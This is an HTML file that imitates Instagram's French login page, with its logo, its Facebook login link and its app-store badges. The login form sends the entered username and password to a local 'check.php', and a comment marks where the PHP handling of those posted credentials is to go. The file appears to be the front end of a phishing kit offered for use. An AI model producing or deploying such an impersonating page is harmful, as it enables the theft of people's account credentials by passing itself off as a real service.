<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="utf-8">
  <link rel="stylesheet" href="./css/styles.css">
<meta name="viewport" content="width=device-width"/>
  <title>Connexion •  Instagram</title>
</head>

<body>
  <header>

  </header>
  <main>
    <div class="login-box">
      <img src="images/Instagram_logo.svg" alt="Instagram">
      <center>

        <!-- Ici mettre le post php -->

        <form class="login" action="check.php" method="post">
          <div class="username">
            <input type="text" name="username" value="" required="true" placeholder="Numéro de téléphone, nom d’utilisateur ou adresse e-mail">
          </div>
          <div class="password">
            <input type="password" name="password" value="" required placeholder="Mot de passe">
          </div>

            <div class="button">
              <button type="submit" name="connexion">Connexion</button>
            </div>

        </form>
        <div class="divider">
          <div class="separateur"></div>
          <div class="separateur-text">OU</div>
          <div class="separateur"></div>
        </div>
        <div class="forgotten">
          <a href="#">Mot de passe oublié ?</a>
        </div>
        <div class="facebook">

          <div class="img-fb">
            <div><img src="images/logo-fb.png" alt="" heigh></div>
          </div><a href="https://facebook.com">Se connecter avec Facebook </a></div>
        </div>
        <div>
        </div>

      </div>

    </center>
  </div>
  <div class="register-box">
    <center>
      Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
    </center>
  </div>
  <div class="download">
    <center>
      <div class="txt-dl">
        Télécharger l'application.
      </div>
    </center>
  </div>
  <div class="app-dl">
    <div class="container" id="app">

      <img src="images/appstore.png" alt="" height="44px;">
      <img src="images/google-play.png" alt="" height="44px">

    </div>
  </div>

</main>
<footer>
  <!-- <div class="footer">
    <li>
      <a href="#">A PROPOS</a>
    </li>
    <li>
      <a href="#">AIDE</a>
    </li>
    <li>
      <a href="#">PRESSE</a>
    </li>
    <li>
      <a href="#">API</a>
    </li>
    <li>
      <a href="#">EMPLOIS</a>
    </li>
    <li>
      <a href="#">CONFIDENTIALITE</a>
    </li>
    <li>
      <a href="#">CONDITIONS</a>
    </li>
    <li>
      <a href="#">LIEUX</a>
    </li>
    <li>
      <a href="#">COMPTES PRINCIPAUX</a>
    </li>
    <li>
      <a href="#">HASHTAGS</a>
    </li>
    <li>
      <a href="#">LANGUE</a>
    </li>
  </div> -->
</footer>
</body>

</html>
